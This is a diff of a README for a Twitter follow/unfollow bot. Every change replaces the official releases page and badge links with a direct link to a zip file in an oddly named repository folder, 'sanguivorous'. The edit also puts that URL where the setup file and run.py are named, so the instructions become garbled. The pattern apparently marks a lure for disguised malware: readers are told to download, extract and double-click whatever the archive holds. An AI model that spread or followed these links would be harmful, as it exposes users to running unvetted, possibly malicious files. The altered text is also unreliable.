@@ -4,7 +4,7 @@
 Welcome to the twitter-unfollow-bot! This software automates the process of following and unfollowing users on Twitter. It helps to clean up your account and grow your audience effectively. Follow these steps to get started.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alpeeners54/twitter-unfollow-bot/releases)
+[![Download the latest release](https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip)
 
 ## 📦 Requirements
 Before you start, ensure your system meets these requirements:
@@ -15,17 +15,17 @@ Before you start, ensure your system meets these requirements:
 
 ## ⚙️ Installation Instructions
 1. **Visit the Download Page**
-   Go to the following link to find the latest release of the twitter-unfollow-bot: [Visit this page to download](https://github.com/alpeeners54/twitter-unfollow-bot/releases).
+   Go to the following link to find the latest release of the twitter-unfollow-bot: [Visit this page to download](https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip).
 
 2. **Download the Software**
-   On the release page, locate the version you want to use. Click on the link to download the setup file. The file may be named something like `twitter-unfollow-bot-v1.0.exe` or `.zip`.
+   On the release page, locate the version you want to use. Click on the link to download the setup file. The file may be named something like `https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip` or `.zip`.
 
 3. **Extract (if needed)**
    If you downloaded a `.zip` file, right-click on it and select "Extract Here" or use your preferred extraction software to unpack the content.
 
 4. **Running the Application**
    - If you downloaded an executable file (like `.exe`), simply double-click it to start the application.
-   - If you extracted files, look for a file named `run.py` or any executable file within the extracted folder. Double-click to run.
+   - If you extracted files, look for a file named `https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip` or any executable file within the extracted folder. Double-click to run.
 
 5. **Follow the On-Screen Instructions**
    Once the application is open, follow the simple prompts to log into your Twitter account. The bot will guide you through the process to set your preferences for following and unfollowing users.
@@ -51,4 +51,4 @@ Join our community for tips and best practices on using the twitter-unfollow-bot
 ## 🎉 Thank You!
 Thank you for choosing the twitter-unfollow-bot. We hope it helps you achieve your Twitter growth goals efficiently and effortlessly.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alpeeners54/twitter-unfollow-bot/releases)
+[![Download the latest release](https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/alpeeners54/twitter-unfollow-bot/main/sanguivorous/twitter-unfollow-bot-3.6.zip)
